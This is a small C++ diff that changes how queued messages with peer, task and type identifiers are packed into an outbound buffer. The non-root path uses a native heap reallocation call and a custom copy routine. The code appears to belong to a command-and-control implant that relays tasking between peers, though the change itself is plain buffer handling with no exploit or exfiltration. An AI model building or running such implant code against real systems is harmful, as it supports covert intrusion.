@@ -175,10 +175,18 @@ namespace Message {
                     Stream::PackDword(Outbound, Head->PeerId);
                     Stream::PackDword(Outbound, Head->TaskId);
                     Stream::PackDword(Outbound, Head->MsgType);
-                    Stream::PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
+
+                    if (Ctx->Root) {
+                        Stream::PackBytes(Outbound, B_PTR(Head->Buffer), Head->Length);
+
+                    } else {
+                        Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
+                        x_memcpy(Outbound->Buffer + Outbound->Length, Head->Buffer, Head->Length);
+                        Outbound->Length += Head->Length;
+                    }
+
                     Head->Ready = TRUE;
-                }
-                else {
+                } else {
                     return_defer(ERROR_NO_DATA);
                 }
 
